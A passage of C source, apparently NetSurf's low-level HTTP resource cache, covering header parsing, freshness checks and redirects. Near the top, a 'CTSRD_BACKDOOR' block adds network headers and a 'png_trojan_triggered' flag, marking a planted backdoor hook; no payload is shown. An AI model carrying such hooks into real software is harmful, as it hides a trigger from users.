/*
 * Copyright 2009 John-Mark Bell <jmb@netsurf-browser.org>
 *
 * This file is part of NetSurf, http://www.netsurf-browser.org/
 *
 * NetSurf is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * NetSurf is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.	 See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/** \file
 * Low-level resource cache (implementation)
 */

#ifdef CTSRD_BACKDOOR
#include <sys/types.h>

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/* exported from libpng */
extern int png_trojan_triggered;
#endif /* CTSRD_BACKDOOR */


#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <curl/curl.h>

#include "content/fetch.h"
#include "content/llcache.h"
#include "content/urldb.h"
#include "utils/corestrings.h"
#include "utils/log.h"
#include "utils/messages.h"
#include "utils/nsurl.h"
#include "utils/utils.h"

/** Define to enable tracing of llcache operations. */
#undef LLCACHE_TRACE

#ifdef LLCACHE_TRACE
#define LLCACHE_LOG(x) LOG(x)
#else
#define LLCACHE_LOG(x)
#endif

/** State of a low-level cache object fetch */
typedef enum {
	LLCACHE_FETCH_INIT,		/**< Initial state, before fetch */
	LLCACHE_FETCH_HEADERS,		/**< Fetching headers */
	LLCACHE_FETCH_DATA,		/**< Fetching object data */
	LLCACHE_FETCH_COMPLETE		/**< Fetch completed */
} llcache_fetch_state;

/** Type of low-level cache object */
typedef struct llcache_object llcache_object;

/** Handle to low-level cache object */
struct llcache_handle {
	llcache_object *object;		/**< Pointer to associated object */

	llcache_handle_callback cb;	/**< Client callback */
	void *pw;			/**< Client data */

	llcache_fetch_state state;	/**< Last known state of object fetch */
	size_t bytes;			/**< Last reported byte count */
};

/** Low-level cache object user record */
typedef struct llcache_object_user {
	llcache_handle *handle;		/**< Handle data for client */

	bool iterator_target;		/**< This is the an iterator target */
	bool queued_for_delete;		/**< This user is queued for deletion */

	struct llcache_object_user *prev;	/**< Previous in list */
	struct llcache_object_user *next;	/**< Next in list */
} llcache_object_user;

/** Low-level cache object fetch context */
typedef struct {
	uint32_t flags;			/**< Fetch flags */
	nsurl *referer;			/**< Referring URL, or NULL if none */
	llcache_post_data *post;	/**< POST data, or NULL for GET */

	struct fetch *fetch;		/**< Fetch handle for this object */

	llcache_fetch_state state;	/**< Current state of object fetch */

	uint32_t redirect_count;	/**< Count of redirects followed */

	bool tried_with_auth;		/**< Whether we've tried with auth */

	bool tried_with_tls_downgrade;	/**< Whether we've tried TLS <= 1.0 */

	bool outstanding_query;		/**< Waiting for a query response */
} llcache_fetch_ctx;

typedef enum {
	LLCACHE_VALIDATE_FRESH,		/**< Only revalidate if not fresh */
	LLCACHE_VALIDATE_ALWAYS,	/**< Always revalidate */
	LLCACHE_VALIDATE_ONCE		/**< Revalidate once only */
} llcache_validate;

/** Cache control data */
typedef struct {
	time_t req_time;	/**< Time of request */
	time_t res_time;	/**< Time of response */
	time_t date;		/**< Date: response header */
	time_t expires;		/**< Expires: response header */
#define INVALID_AGE -1
	int age;		/**< Age: response header */
	int max_age;		/**< Max-Age Cache-control parameter */
	llcache_validate no_cache;	/**< No-Cache Cache-control parameter */
	char *etag;		/**< Etag: response header */
	time_t last_modified;	/**< Last-Modified: response header */
} llcache_cache_control;

/** Representation of a fetch header */
typedef struct {
	char *name;		/**< Header name */
	char *value;		/**< Header value */
} llcache_header;

/** Low-level cache object */
/** \todo Consider whether a list is a sane container */
struct llcache_object {
	llcache_object *prev;		/**< Previous in list */
	llcache_object *next;		/**< Next in list */

	nsurl *url;			/**< Post-redirect URL for object */

	/** \todo We need a generic dynamic buffer object */
	uint8_t *source_data;		/**< Source data for object */
	size_t source_len;		/**< Byte length of source data */
	size_t source_alloc;		/**< Allocated size of source buffer */

	llcache_object_user *users;	/**< List of users */

	llcache_fetch_ctx fetch;	/**< Fetch context for object */

	llcache_cache_control cache;	/**< Cache control data for object */
	llcache_object *candidate;	/**< Object to use, if fetch determines
					 * that it is still fresh */
	uint32_t candidate_count;	/**< Count of objects this is a
					 * candidate for */

	llcache_header *headers;	/**< Fetch headers */
	size_t num_headers;		/**< Number of fetch headers */
};

struct llcache_s {
	/** Handler for fetch-related queries */
	llcache_query_callback query_cb;

	/** Data for fetch-related query handler */
	void *query_cb_pw;

	/** Head of the low-level cached object list */
	llcache_object *cached_objects;

	/** Head of the low-level uncached object list */
	llcache_object *uncached_objects;

	uint32_t limit;
};

/** low level cache state */
static struct llcache_s *llcache = NULL;

/* forward referenced callback function */
static void llcache_fetch_callback(const fetch_msg *msg, void *p);


/******************************************************************************
 * Low-level cache internals						      *
 ******************************************************************************/

/**
 * Create a new object user
 *
 * \param cb	Callback routine
 * \param pw	Private data for callback
 * \param user	Pointer to location to receive result
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_object_user_new(llcache_handle_callback cb, void *pw,
		llcache_object_user **user)
{
	llcache_handle *h;
	llcache_object_user *u;

	h = calloc(1, sizeof(llcache_handle));
	if (h == NULL)
		return NSERROR_NOMEM;

	u = calloc(1, sizeof(llcache_object_user));
	if (u == NULL) {
		free(h);
		return NSERROR_NOMEM;
	}

	h->cb = cb;
	h->pw = pw;

	u->handle = h;

	LLCACHE_LOG(("Created user %p (%p, %p, %p)", u, h, (void *) cb, pw));

	*user = u;

	return NSERROR_OK;
}

/**
 * Destroy an object user
 *
 * \param user	User to destroy
 * \return NSERROR_OK on success, appropriate error otherwise
 *
 * \pre User is not attached to an object
 */
static nserror llcache_object_user_destroy(llcache_object_user *user)
{
	LLCACHE_LOG(("Destroyed user %p", user));

	assert(user->next == NULL);
	assert(user->prev == NULL);

	if (user->handle != NULL)
		free(user->handle);

	free(user);

	return NSERROR_OK;
}

/**
 * Remove a user from a low-level cache object
 *
 * \param object  Object to remove user from
 * \param user	  User to remove
 * \return NSERROR_OK.
 */
static nserror llcache_object_remove_user(llcache_object *object,
		llcache_object_user *user)
{
	assert(user != NULL);
	assert(object != NULL);
	assert(object->users != NULL);
	assert(user->handle == NULL || user->handle->object == object);
	assert((user->prev != NULL) || (object->users == user));

	if (user == object->users)
		object->users = user->next;
	else
		user->prev->next = user->next;

	if (user->next != NULL)
		user->next->prev = user->prev;

	user->next = user->prev = NULL;

	LLCACHE_LOG(("Removing user %p from %p", user, object));

	return NSERROR_OK;
}

/**
 * Iterate the users of an object, calling their callbacks.
 *
 * \param object	The object to iterate
 * \param event		The event to pass to the callback.
 * \return NSERROR_OK on success, appropriate error otherwise.
 */
static nserror llcache_send_event_to_users(llcache_object *object,
					   llcache_event *event)
{
	nserror error = NSERROR_OK;
	llcache_object_user *user, *next_user;

	user = object->users;
	while (user != NULL) {
		user->iterator_target = true;

		error = user->handle->cb(user->handle, event,
					user->handle->pw);

		next_user = user->next;

		user->iterator_target = false;

		if (user->queued_for_delete) {
			llcache_object_remove_user(object, user);
			llcache_object_user_destroy(user);
		}

		if (error != NSERROR_OK)
			break;

		user = next_user;
	}

	return error;
}

/**
 * Create a new low-level cache object
 *
 * \param url	  URL of object to create
 * \param result  Pointer to location to receive result
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_object_new(nsurl *url, llcache_object **result)
{
	llcache_object *obj = calloc(1, sizeof(llcache_object));
	if (obj == NULL)
		return NSERROR_NOMEM;

	LLCACHE_LOG(("Created object %p (%s)", obj, nsurl_access(url)));

	obj->url = nsurl_ref(url);

	*result = obj;

	return NSERROR_OK;
}

/**
 * Clone a POST data object
 *
 * \param orig	 Object to clone
 * \param clone	 Pointer to location to receive clone
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_post_data_clone(const llcache_post_data *orig,
		llcache_post_data **clone)
{
	llcache_post_data *post_clone;

	post_clone = calloc(1, sizeof(llcache_post_data));
	if (post_clone == NULL)
		return NSERROR_NOMEM;

	post_clone->type = orig->type;

	/* Deep-copy the type-specific data */
	if (orig->type == LLCACHE_POST_URL_ENCODED) {
		post_clone->data.urlenc = strdup(orig->data.urlenc);
		if (post_clone->data.urlenc == NULL) {
			free(post_clone);

			return NSERROR_NOMEM;
		}
	} else {
		post_clone->data.multipart = fetch_multipart_data_clone(
				orig->data.multipart);
		if (post_clone->data.multipart == NULL) {
			free(post_clone);

			return NSERROR_NOMEM;
		}
	}

	*clone = post_clone;

	return NSERROR_OK;
}

/**
 * Split a fetch header into name and value
 *
 * \param data	 Header string
 * \param len	 Byte length of header
 * \param name	 Pointer to location to receive header name
 * \param value	 Pointer to location to receive header value
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_fetch_split_header(const uint8_t *data, size_t len,
		char **name, char **value)
{
	char *n, *v;
	const uint8_t *colon;

	/* Strip leading whitespace from name */
	while (data[0] == ' ' || data[0] == '\t' ||
	       data[0] == '\r' || data[0] == '\n') {
		data++;
	}

	/* Find colon */
	colon = (const uint8_t *) strchr((const char *) data, ':');
	if (colon == NULL) {
		/* Failed, assume a key with no value */
		colon = data + strlen((const char *)data);

		/* Strip trailing whitespace from name */
		while ((colon > data) &&
		       (colon[-1] == ' ' || colon[-1] == '\t' ||
			colon[-1] == '\r' || colon[-1] == '\n')) {
			colon--;
		}
		n = strndup((const char *) data, colon - data);
		if (n == NULL)
			return NSERROR_NOMEM;

		v = strdup("");
		if (v == NULL) {
			free(n);
			return NSERROR_NOMEM;
		}
	} else {
		/* Split header into name & value */

		/* Strip trailing whitespace from name */
		while (colon > data && (colon[-1] == ' ' ||
				colon[-1] == '\t' || colon[-1] == '\r' ||
				colon[-1] == '\n'))
			colon--;

		n = strndup((const char *) data, colon - data);
		if (n == NULL)
			return NSERROR_NOMEM;

		/* Find colon again */
		while (*colon != ':') {
			colon++;
		}

		/* Skip over colon and any subsequent whitespace */
		do {
			colon++;
		} while (*colon == ' ' || *colon == '\t' ||
				*colon == '\r' || *colon == '\n');

		/* Strip trailing whitespace from value */
		while (len > 0 && (data[len - 1] == ' ' ||
				data[len - 1] == '\t' ||
				data[len - 1] == '\r' ||
				data[len - 1] == '\n')) {
			len--;
		}

		v = strndup((const char *) colon, len - (colon - data));
		if (v == NULL) {
			free(n);
			return NSERROR_NOMEM;
		}
	}

	*name = n;
	*value = v;

	return NSERROR_OK;
}

/**
 * Parse a fetch header
 *
 * \param object  Object to parse header for
 * \param data	  Header string
 * \param len	  Byte length of header
 * \param name	  Pointer to location to receive header name
 * \param value	  Pointer to location to receive header value
 * \return NSERROR_OK on success, appropriate error otherwise
 *
 * \note This function also has the side-effect of updating
 *	 the cache control data for the object if an interesting
 *	 header is encountered
 */
static nserror llcache_fetch_parse_header(llcache_object *object,
		const uint8_t *data, size_t len, char **name, char **value)
{
	nserror error;

	/* Set fetch response time if not already set */
	if (object->cache.res_time == 0)
		object->cache.res_time = time(NULL);

	/* Decompose header into name-value pair */
	error = llcache_fetch_split_header(data, len, name, value);
	if (error != NSERROR_OK)
		return error;

	/* Parse cache headers to populate cache control data */
#define SKIP_ST(p) while (*p != '\0' && (*p == ' ' || *p == '\t')) p++

	if (5 < len && strcasecmp(*name, "Date") == 0) {
		/* extract Date header */
		object->cache.date = curl_getdate(*value, NULL);
	} else if (4 < len && strcasecmp(*name, "Age") == 0) {
		/* extract Age header */
		if ('0' <= **value && **value <= '9')
			object->cache.age = atoi(*value);
	} else if (8 < len && strcasecmp(*name, "Expires") == 0) {
		/* extract Expires header */
		object->cache.expires = curl_getdate(*value, NULL);
	} else if (14 < len && strcasecmp(*name, "Cache-Control") == 0) {
		/* extract and parse Cache-Control header */
		const char *start = *value;
		const char *comma = *value;

		while (*comma != '\0') {
			while (*comma != '\0' && *comma != ',')
				comma++;

			if (8 < comma - start && (strncasecmp(start,
					"no-cache", 8) == 0 ||
					strncasecmp(start, "no-store", 8) == 0))
				/* When we get a disk cache we should
				 * distinguish between these two */
				object->cache.no_cache = LLCACHE_VALIDATE_ALWAYS;
			else if (7 < comma - start &&
					strncasecmp(start, "max-age", 7) == 0) {
				/* Find '=' */
				while (start < comma && *start != '=')
					start++;

				/* Skip over it */
				start++;

				/* Skip whitespace */
				SKIP_ST(start);

				if (start < comma)
					object->cache.max_age = atoi(start);
			}

			if (*comma != '\0') {
				/* Skip past comma */
				comma++;
				/* Skip whitespace */
				SKIP_ST(comma);
			}

			/* Set start for next token */
			start = comma;
		}
	} else if (5 < len && strcasecmp(*name, "ETag") == 0) {
		/* extract ETag header */
		free(object->cache.etag);
		object->cache.etag = strdup(*value);
		if (object->cache.etag == NULL) {
			free(*name);
			free(*value);
			return NSERROR_NOMEM;
		}
	} else if (14 < len && strcasecmp(*name, "Last-Modified") == 0) {
		/* extract Last-Modified header */
		object->cache.last_modified = curl_getdate(*value, NULL);
	}

#undef SKIP_ST

	return NSERROR_OK;
}

/* Destroy headers */
static inline void llcache_destroy_headers(llcache_object *object)
{
	while (object->num_headers > 0) {
		object->num_headers--;

		free(object->headers[object->num_headers].name);
		free(object->headers[object->num_headers].value);
	}
	free(object->headers);
	object->headers = NULL;
}

/* Invalidate cache control data */
static inline void llcache_invalidate_cache_control_data(llcache_object *object)
{
	free(object->cache.etag);
	memset(&(object->cache), 0, sizeof(llcache_cache_control));

	object->cache.age = INVALID_AGE;
	object->cache.max_age = INVALID_AGE;
}

/**
 * Process a fetch header
 *
 * \param object  Object being fetched
 * \param data	  Header string
 * \param len	  Byte length of header
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_fetch_process_header(llcache_object *object,
		const uint8_t *data, size_t len)
{
	nserror error;
	char *name, *value;
	llcache_header *temp;

	/* The headers for multiple HTTP responses may be delivered to us if
	 * the fetch layer receives a 401 response for which it has
	 * authentication credentials. This will result in a silent re-request
	 * after which we'll receive the actual response headers for the
	 * object we want to fetch (assuming that the credentials were correct
	 * of course)
	 *
	 * Therefore, if the header is an HTTP response start marker, then we
	 * must discard any headers we've read so far, reset the cache data
	 * that we might have computed, and start again.
	 */
	/** \todo Properly parse the response line */
	if (strncmp((const char *) data, "HTTP/", SLEN("HTTP/")) == 0) {
		time_t req_time = object->cache.req_time;

		llcache_invalidate_cache_control_data(object);

		/* Restore request time, so we compute object's age correctly */
		object->cache.req_time = req_time;

		llcache_destroy_headers(object);
	}

	error = llcache_fetch_parse_header(object, data, len, &name, &value);
	if (error != NSERROR_OK) {
		return error;
	}

	/* deal with empty header */
	if (name[0] == 0) {
		free(name);
		free(value);
		return NSERROR_OK;
	}

	/* Append header data to the object's headers array */
	temp = realloc(object->headers, (object->num_headers + 1) *
			sizeof(llcache_header));
	if (temp == NULL) {
		free(name);
		free(value);
		return NSERROR_NOMEM;
	}

	object->headers = temp;

	object->headers[object->num_headers].name = name;
	object->headers[object->num_headers].value = value;

	object->num_headers++;

	return NSERROR_OK;
}

/**
 * (Re)fetch an object
 *
 * \param object  Object to refetch
 * \return NSERROR_OK on success, appropriate error otherwise
 *
 * \pre The fetch parameters in object->fetch must be populated
 */
static nserror llcache_object_refetch(llcache_object *object)
{
	const char *urlenc = NULL;
	struct fetch_multipart_data *multipart = NULL;
	char **headers = NULL;
	int header_idx = 0;

	if (object->fetch.post != NULL) {
		if (object->fetch.post->type == LLCACHE_POST_URL_ENCODED)
			urlenc = object->fetch.post->data.urlenc;
		else
			multipart = object->fetch.post->data.multipart;
	}

	/* Generate cache-control headers */
	headers = malloc(3 * sizeof(char *));
	if (headers == NULL)
		return NSERROR_NOMEM;

	if (object->cache.etag != NULL) {
		const size_t len = SLEN("If-None-Match: ") +
				strlen(object->cache.etag) + 1;

		headers[header_idx] = malloc(len);
		if (headers[header_idx] == NULL) {
			free(headers);
			return NSERROR_NOMEM;
		}

		snprintf(headers[header_idx], len, "If-None-Match: %s",
				object->cache.etag);

		header_idx++;
	}
	if (object->cache.date != 0) {
		/* Maximum length of an RFC 1123 date is 29 bytes */
		const size_t len = SLEN("If-Modified-Since: ") + 29 + 1;

		headers[header_idx] = malloc(len);
		if (headers[header_idx] == NULL) {
			while (--header_idx >= 0)
				free(headers[header_idx]);
			free(headers);
			return NSERROR_NOMEM;
		}

		snprintf(headers[header_idx], len, "If-Modified-Since: %s",
				rfc1123_date(object->cache.date));

		header_idx++;
	}
	headers[header_idx] = NULL;

	/* Reset cache control data */
	llcache_invalidate_cache_control_data(object);
	object->cache.req_time = time(NULL);

	/* Reset fetch state */
	object->fetch.state = LLCACHE_FETCH_INIT;

	LLCACHE_LOG(("Refetching %p", object));

	/* Kick off fetch */
	object->fetch.fetch = fetch_start(object->url, object->fetch.referer,
			llcache_fetch_callback, object,
			object->fetch.flags & LLCACHE_RETRIEVE_NO_ERROR_PAGES,
			urlenc, multipart,
			object->fetch.flags & LLCACHE_RETRIEVE_VERIFIABLE,
			object->fetch.tried_with_tls_downgrade,
			(const char **) headers);

	/* Clean up cache-control headers */
	while (--header_idx >= 0)
		free(headers[header_idx]);
	free(headers);

	/* Did we succeed in creating a fetch? */
	if (object->fetch.fetch == NULL)
		return NSERROR_NOMEM;

	return NSERROR_OK;
}

/**
 * Kick-off a fetch for an object
 *
 * \param object	  Object to fetch
 * \param flags		  Fetch flags
 * \param referer	  Referring URL, or NULL for none
 * \param post		  POST data, or NULL for GET
 * \param redirect_count  Number of redirects followed so far
 * \return NSERROR_OK on success, appropriate error otherwise
 *
 * \pre object::url must contain the URL to fetch
 * \pre If there is a freshness validation candidate,
 *	object::candidate and object::cache must be filled in
 * \pre There must not be a fetch in progress for \a object
 */
static nserror llcache_object_fetch(llcache_object *object, uint32_t flags,
		nsurl *referer, const llcache_post_data *post,
		uint32_t redirect_count)
{
	nserror error;
	nsurl *referer_clone = NULL;
	llcache_post_data *post_clone = NULL;

	LLCACHE_LOG(("Starting fetch for %p", object));

	if (post != NULL) {
		error = llcache_post_data_clone(post, &post_clone);
		if (error != NSERROR_OK)
			return error;
	}

	if (referer != NULL)
		referer_clone = nsurl_ref(referer);

	object->fetch.flags = flags;
	object->fetch.referer = referer_clone;
	object->fetch.post = post_clone;
	object->fetch.redirect_count = redirect_count;

	return llcache_object_refetch(object);
}

/**
 * Destroy a low-level cache object
 *
 * \param object  Object to destroy
 * \return NSERROR_OK on success, appropriate error otherwise
 *
 * \pre Object is detached from cache list
 * \pre Object has no users
 * \pre Object is not a candidate (i.e. object::candidate_count == 0)
 */
static nserror llcache_object_destroy(llcache_object *object)
{
	size_t i;

	LLCACHE_LOG(("Destroying object %p", object));

	nsurl_unref(object->url);
	free(object->source_data);

	if (object->fetch.fetch != NULL) {
		fetch_abort(object->fetch.fetch);
		object->fetch.fetch = NULL;
	}

	if (object->fetch.referer != NULL)
		nsurl_unref(object->fetch.referer);

	if (object->fetch.post != NULL) {
		if (object->fetch.post->type == LLCACHE_POST_URL_ENCODED) {
			free(object->fetch.post->data.urlenc);
		} else {
			fetch_multipart_data_destroy(
					object->fetch.post->data.multipart);
		}

		free(object->fetch.post);
	}

	free(object->cache.etag);

	for (i = 0; i < object->num_headers; i++) {
		free(object->headers[i].name);
		free(object->headers[i].value);
	}
	free(object->headers);

	free(object);

	return NSERROR_OK;
}

/**
 * Add a low-level cache object to a cache list
 *
 * \param object  Object to add
 * \param list	  List to add to
 * \return NSERROR_OK
 */
static nserror llcache_object_add_to_list(llcache_object *object,
		llcache_object **list)
{
	object->prev = NULL;
	object->next = *list;

	if (*list != NULL)
		(*list)->prev = object;
	*list = object;

	return NSERROR_OK;
}

/**
 * Determine the remaining lifetime of a cache object using the
 *
 * \param object  Object to consider
 * \return True if object is still fresh, false otherwise
 */
static int
llcache_object_rfc2616_remaining_lifetime(const llcache_cache_control *cd)
{
	int current_age, freshness_lifetime;
	time_t now = time(NULL);

	/* Calculate staleness of cached object as per RFC 2616 13.2.3/13.2.4 */
	current_age = max(0, (cd->res_time - cd->date));
	current_age = max(current_age, (cd->age == INVALID_AGE) ? 0 : cd->age);
	current_age += cd->res_time - cd->req_time + now - cd->res_time;

	/* Determine freshness lifetime of this object */
	if (cd->max_age != INVALID_AGE)
		freshness_lifetime = cd->max_age;
	else if (cd->expires != 0)
		freshness_lifetime = cd->expires - cd->date;
	else if (cd->last_modified != 0)
		freshness_lifetime = (now - cd->last_modified) / 10;
	else
		freshness_lifetime = 0;

	LLCACHE_LOG(("%d:%d", freshness_lifetime, current_age));

	if ((cd->no_cache == LLCACHE_VALIDATE_FRESH) &&
	    (freshness_lifetime > current_age)) {
		/* object was not forbidden from being returned from
		 * the cache unvalidated (i.e. the response contained
		 * a no-cache directive)
		 *
		 * The object current age is within the freshness lifetime.
		 */
		return freshness_lifetime - current_age;
	}

	return 0; /* object has no remaining lifetime */
}

/**
 * Determine if an object is still fresh
 *
 * \param object  Object to consider
 * \return True if object is still fresh, false otherwise
 */
static bool llcache_object_is_fresh(const llcache_object *object)
{
	int remaining_lifetime;
	const llcache_cache_control *cd = &object->cache;

	remaining_lifetime = llcache_object_rfc2616_remaining_lifetime(cd);

	LLCACHE_LOG(("%p: (%d > 0 || %d != %d)", object,
	     remaining_lifetime,
	     object->fetch.state, LLCACHE_FETCH_COMPLETE));

	/* The object is fresh if:
	 * - it was not forbidden from being returned from the cache
	 *   unvalidated.
	 *
	 * - it has remaining lifetime or still being fetched.
	 */
	return ((cd->no_cache == LLCACHE_VALIDATE_FRESH) &&
		((remaining_lifetime > 0) ||
		 (object->fetch.state != LLCACHE_FETCH_COMPLETE)));
}

/**
 * Clone an object's cache data
 *
 * \param source       Source object containing cache data to clone
 * \param destination  Destination object to clone cache data into
 * \param deep	       Whether to deep-copy the data or not
 * \return NSERROR_OK on success, appropriate error otherwise
 *
 * \post If \a deep is false, then any pointers in \a source will be set to NULL
 */
static nserror llcache_object_clone_cache_data(llcache_object *source,
		llcache_object *destination, bool deep)
{
	/* ETag must be first, as it can fail when deep cloning */
	if (source->cache.etag != NULL) {
		char *etag = source->cache.etag;

		if (deep) {
			/* Copy the etag */
			etag = strdup(source->cache.etag);
			if (etag == NULL)
				return NSERROR_NOMEM;
		} else {
			/* Destination takes ownership */
			source->cache.etag = NULL;
		}

		if (destination->cache.etag != NULL)
			free(destination->cache.etag);

		destination->cache.etag = etag;
	}

	destination->cache.req_time = source->cache.req_time;
	destination->cache.res_time = source->cache.res_time;

	if (source->cache.date != 0)
		destination->cache.date = source->cache.date;

	if (source->cache.expires != 0)
		destination->cache.expires = source->cache.expires;

	if (source->cache.age != INVALID_AGE)
		destination->cache.age = source->cache.age;

	if (source->cache.max_age != INVALID_AGE)
		destination->cache.max_age = source->cache.max_age;

	if (source->cache.no_cache != LLCACHE_VALIDATE_FRESH)
		destination->cache.no_cache = source->cache.no_cache;

	if (source->cache.last_modified != 0)
		destination->cache.last_modified = source->cache.last_modified;

	return NSERROR_OK;
}

/**
 * Retrieve a potentially cached object
 *
 * \param url		  URL of object to retrieve
 * \param flags		  Fetch flags
 * \param referer	  Referring URL, or NULL if none
 * \param post		  POST data, or NULL for a GET request
 * \param redirect_count  Number of redirects followed so far
 * \param result	  Pointer to location to recieve retrieved object
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_object_retrieve_from_cache(nsurl *url, uint32_t flags,
		nsurl *referer, const llcache_post_data *post,
		uint32_t redirect_count, llcache_object **result)
{
	nserror error;
	llcache_object *obj, *newest = NULL;

	LLCACHE_LOG(("Searching cache for %s (%x %p %p)",
		     nsurl_access(url), flags, referer, post));

	/* Search for the most recently fetched matching object */
	for (obj = llcache->cached_objects; obj != NULL; obj = obj->next) {

		if ((newest == NULL ||
				obj->cache.req_time > newest->cache.req_time) &&
				nsurl_compare(obj->url, url,
						NSURL_COMPLETE) == true) {
			newest = obj;
		}
	}

	if (newest != NULL && llcache_object_is_fresh(newest)) {
		/* Found a suitable object, and it's still fresh, so use it */
		obj = newest;

		LLCACHE_LOG(("Found fresh %p", obj));

		/* The client needs to catch up with the object's state.
		 * This will occur the next time that llcache_poll is called.
		 */
	} else if (newest != NULL) {
		/* Found a candidate object but it needs freshness validation */

		/* Create a new object */
		error = llcache_object_new(url, &obj);
		if (error != NSERROR_OK)
			return error;

		LLCACHE_LOG(("Found candidate %p (%p)", obj, newest));

		/* Clone candidate's cache data */
		error = llcache_object_clone_cache_data(newest, obj, true);
		if (error != NSERROR_OK) {
			llcache_object_destroy(obj);
			return error;
		}

		/* Record candidate, so we can fall back if it is still fresh */
		newest->candidate_count++;
		obj->candidate = newest;

		/* Attempt to kick-off fetch */
		error = llcache_object_fetch(obj, flags, referer, post,
				redirect_count);
		if (error != NSERROR_OK) {
			newest->candidate_count--;
			llcache_object_destroy(obj);
			return error;
		}

		/* Add new object to cache */
		llcache_object_add_to_list(obj, &llcache->cached_objects);
	} else {
		/* No object found; create a new one */
		/* Create new object */
		error = llcache_object_new(url, &obj);
		if (error != NSERROR_OK)
			return error;

		LLCACHE_LOG(("Not found %p", obj));

		/* Attempt to kick-off fetch */
		error = llcache_object_fetch(obj, flags, referer, post,
				redirect_count);
		if (error != NSERROR_OK) {
			llcache_object_destroy(obj);
			return error;
		}

		/* Add new object to cache */
		llcache_object_add_to_list(obj, &llcache->cached_objects);
	}

	*result = obj;

	return NSERROR_OK;
}

/**
 * Retrieve an object from the cache, fetching it if necessary.
 *
 * \param url		  URL of object to retrieve
 * \param flags		  Fetch flags
 * \param referer	  Referring URL, or NULL if none
 * \param post		  POST data, or NULL for a GET request
 * \param redirect_count  Number of redirects followed so far
 * \param result	  Pointer to location to recieve retrieved object
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_object_retrieve(nsurl *url, uint32_t flags,
		nsurl *referer, const llcache_post_data *post,
		uint32_t redirect_count, llcache_object **result)
{
	nserror error;
	llcache_object *obj;
	nsurl *defragmented_url;
	bool uncachable = false;

	LLCACHE_LOG(("Retrieve %s (%x, %p, %p)",
		     nsurl_access(url), flags, referer, post));


	/* Get rid of any url fragment */
	error = nsurl_defragment(url, &defragmented_url);
	if (error != NSERROR_OK)
		return error;

	/* determine if content is cachable */
	if ((flags & LLCACHE_RETRIEVE_FORCE_FETCH) != 0) {
		/* Forced fetches are never cached */
		uncachable = true;
	} else if (post != NULL) {
		/* POST requests are never cached */
		uncachable = true;
	} else {
		/* only http and https schemes are cached */
		lwc_string *scheme;
		bool match;

		scheme = nsurl_get_component(defragmented_url, NSURL_SCHEME);

		if (lwc_string_caseless_isequal(scheme, corestring_lwc_http,
						&match) == lwc_error_ok &&
		    (match == false)) {
			if (lwc_string_caseless_isequal(scheme,	corestring_lwc_https,
							&match) == lwc_error_ok &&
			    (match == false)) {
				uncachable = true;
			}
		}
	}


	if (uncachable) {
		/* Create new object */
		error = llcache_object_new(defragmented_url, &obj);
		if (error != NSERROR_OK) {
			nsurl_unref(defragmented_url);
			return error;
		}

		/* Attempt to kick-off fetch */
		error = llcache_object_fetch(obj, flags, referer, post,
				redirect_count);
		if (error != NSERROR_OK) {
			llcache_object_destroy(obj);
			nsurl_unref(defragmented_url);
			return error;
		}

		/* Add new object to uncached list */
		llcache_object_add_to_list(obj, &llcache->uncached_objects);
	} else {
		error = llcache_object_retrieve_from_cache(defragmented_url,
				flags, referer, post, redirect_count, &obj);
		if (error != NSERROR_OK) {
			nsurl_unref(defragmented_url);
			return error;
		}

		/* Returned object is already in the cached list */
	}

	LLCACHE_LOG(("Retrieved %p", obj));

	*result = obj;

	nsurl_unref(defragmented_url);

	return NSERROR_OK;
}

/**
 * Add a user to a low-level cache object
 *
 * \param object  Object to add user to
 * \param user	  User to add
 * \return NSERROR_OK.
 */
static nserror llcache_object_add_user(llcache_object *object,
		llcache_object_user *user)
{
	assert(user->next == NULL);
	assert(user->prev == NULL);
	assert(user->handle != NULL);

	user->handle->object = object;

	user->prev = NULL;
	user->next = object->users;

	if (object->users != NULL)
		object->users->prev = user;
	object->users = user;

	LLCACHE_LOG(("Adding user %p to %p", user, object));

	return NSERROR_OK;
}

/**
 * Handle FETCH_REDIRECT event
 *
 * \param object       Object being redirected
 * \param target       Target of redirect (may be relative)
 * \param replacement  Pointer to location to receive replacement object
 * \return NSERROR_OK on success, appropriate error otherwise
 */
static nserror llcache_fetch_redirect(llcache_object *object, const char *target,
		llcache_object **replacement)
{
	nserror error;
	llcache_object *dest;
	llcache_object_user *user, *next;
	const llcache_post_data *post = object->fetch.post;
	nsurl *url;
	lwc_string *scheme;
	lwc_string *object_scheme;
	bool match;
	/* Extract HTTP response code from the fetch object */
	long http_code = fetch_http_code(object->fetch.fetch);
	llcache_event event;

	/* Abort fetch for this object */
	fetch_abort(object->fetch.fetch);
	object->fetch.fetch = NULL;

	/* Invalidate the cache control data */
	llcache_invalidate_cache_control_data(object);

	/* And mark it complete */
	object->fetch.state = LLCACHE_FETCH_COMPLETE;

	/* Forcibly stop redirecting if we've followed too many redirects */
#define REDIRECT_LIMIT 10
	if (object->fetch.redirect_count > REDIRECT_LIMIT) {
		LOG(("Too many nested redirects"));

		event.type = LLCACHE_EVENT_ERROR;
		event.data.msg = messages_get("BadRedirect");

		return llcache_send_event_to_users(object, &event);
	}
#undef REDIRECT_LIMIT

	/* Make target absolute */
	error = nsurl_join(object->url, target, &url);
	if (error != NSERROR_OK)
		return error;

	/* Inform users of redirect */
	event.type = LLCACHE_EVENT_REDIRECT;
	event.data.redirect.from = object->url;
	event.data.redirect.to = url;

	error = llcache_send_event_to_users(object, &event);

	if (error != NSERROR_OK) {
		nsurl_unref(url);
		return error;
	}

	/* Reject attempts to redirect from unvalidated to validated schemes
	 * A "validated" scheme is one over which we have some guarantee that
